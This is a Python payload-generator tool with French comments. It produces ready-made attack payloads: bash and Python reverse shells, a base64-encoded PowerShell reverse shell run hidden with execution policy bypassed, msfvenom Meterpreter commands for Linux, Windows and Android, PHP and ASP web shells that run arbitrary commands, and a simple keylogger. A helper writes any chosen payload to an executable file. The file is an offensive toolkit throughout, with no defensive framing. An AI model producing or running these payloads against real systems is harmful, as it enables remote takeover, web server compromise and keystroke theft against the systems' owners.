#!/usr/bin/env python3
"""
Générateur de payloads pour différentes plateformes
"""

import base64
import os

class PayloadGenerator:
    def __init__(self, lhost="0.0.0.0", lport=4444):
        self.lhost = lhost
        self.lport = lport
    
    def reverse_shell_bash(self):
        """Reverse shell basique en bash"""
        return f"""#!/bin/bash
bash -c 'exec bash -i &>/dev/tcp/{self.lhost}/{self.lport} <&1'
"""
    
    def reverse_shell_python(self):
        """Reverse shell en Python"""
        return f"""#!/usr/bin/env python3
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("{self.lhost}",{self.lport}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
"""
    
    def reverse_shell_powershell(self):
        """Reverse shell PowerShell pour Windows"""
        encoded = base64.b64encode(
            f"$client = New-Object System.Net.Sockets.TCPClient('{self.lhost}',{self.lport});"
            f"$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};"
            f"while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;"
            f"$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
            f"$sendback = (iex $data 2>&1 | Out-String );"
            f"$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
            f"$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
            f"$stream.Write($sendbyte,0,$sendbyte.Length);"
            f"$stream.Flush()}};$client.Close()".encode()
        ).decode()
        
        return f"powershell -NoP -NonI -W Hidden -Exec Bypass -Enc {encoded}"
    
    def meterpreter_payload(self, platform="linux"):
        """Génère un payload Metasploit"""
        if platform == "linux":
            return f"msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={self.lhost} LPORT={self.lport} -f elf -o payload.elf"
        elif platform == "windows":
            return f"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={self.lhost} LPORT={self.lport} -f exe -o payload.exe"
        elif platform == "android":
            return f"msfvenom -p android/meterpreter/reverse_tcp LHOST={self.lhost} LPORT={self.lport} -o payload.apk"
    
    def web_shell_php(self):
        """Web shell PHP"""
        return """<?php
system($_GET['cmd']);
?>"""
    
    def web_shell_asp(self):
        """Web shell ASP pour IIS"""
        return """<%
Dim cmd
cmd = Request.QueryString("cmd")
Execute("Dim shell : Set shell = Server.CreateObject(""WScript.Shell"") : Dim output : output = shell.Exec(""" & cmd & """).StdOut.ReadAll() : Response.Write(output)")
%>"""
    
    def keylogger_script(self, platform="linux"):
        """Script keylogger simple"""
        if platform == "linux":
            return """#!/usr/bin/env python3
import keyboard
import requests

def on_key(event):
    with open("/tmp/keystrokes.log", "a") as f:
        f.write(event.name + "\\n")

keyboard.on_press(on_key)
keyboard.wait()
"""
        else:
            return ""
    
    def create_payload_file(self, payload_type="bash", filename=None):
        """Crée un fichier payload"""
        generators = {
            "bash": self.reverse_shell_bash,
            "python": self.reverse_shell_python,
            "powershell": self.reverse_shell_powershell,
            "php": self.web_shell_php,
            "asp": self.web_shell_asp,
            "keylogger": lambda: self.keylogger_script()
        }
        
        if payload_type not in generators:
            return None
        
        payload = generators[payload_type]()
        
        if not filename:
            ext_map = {
                "bash": ".sh", "python": ".py", "powershell": ".ps1",
                "php": ".php", "asp": ".asp", "keylogger": ".py"
            }
            filename = f"payload_{payload_type}_{self.lport}{ext_map.get(payload_type, '.txt')}"
        
        with open(filename, "w") as f:
            f.write(payload)
        
        os.chmod(filename, 0o755)
        print(f"[+] Payload created: {filename}")
        return filename
